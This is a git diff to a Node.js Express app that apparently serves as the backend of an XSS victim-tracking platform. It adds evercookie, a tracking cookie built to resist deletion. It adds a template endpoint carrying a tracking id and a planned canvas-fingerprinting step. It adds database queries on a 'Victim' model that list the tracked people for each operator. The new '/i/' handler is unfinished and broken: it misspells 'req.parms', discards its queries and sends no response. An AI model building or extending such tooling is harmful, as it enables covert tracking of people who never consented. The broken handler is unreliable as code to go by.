@@ -2,6 +2,7 @@ var express = require('express'),
     session = require('express-session'),
     cookieParser = require('cookie-parser'),
     bodyParser = require('body-parser'),
+    evercookie = require('evercookie'),
     mongoose = require('mongoose'),
     logger = require('morgan'),
     crypto = require('crypto'),
@@ -21,6 +22,7 @@ app.engine('html', ejs.renderFile);
 //   其它
 app.use(logger());
 app.use(cookieParser());
+app.use(evercookie.backend());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded());
 app.use(session({
@@ -38,8 +40,18 @@ app.use('/static', express.static(__dirname+'/static'));
 
 //   TODO 长逻辑, XSS处理部分
 app.all('/', function(req, res){
-    //TODO
-    return res.send('Hello world.');
+    return res.render('bungeegum', {
+        domain:req.header('host'),
+        id:req.query.i
+    });
+});
+app.all('/i/', function(req, res){
+    //TODO who id use "Canvas Fingerprinting"
+    var id = req.parms.i;
+    var who = req.cookies.who;
+    who&&sql.Victim.findOne();
+    id&&sql.Item.findOne();
+    sql.Item.findOne();
 });
 function page(req, res){
     //TODO
@@ -82,13 +94,13 @@ app.get('/home', function(req, res){
     var victim, page;
     sql.Victim.find({name:req.session.user.name}, function(err, info){
         victim = info;
-    });
-    sql.Page.find({name:req.session.user.name}, function(err, info){
-        page = info;
-    });
-    return res.render('home', {
-        victim:victim,
-        page:page
+        sql.Page.find({name:req.session.user.name}, function(err, info){
+            page = info;
+            return res.render('home', {
+                victim:victim,
+                page:page
+            });
+        });
     });
 });
 /*
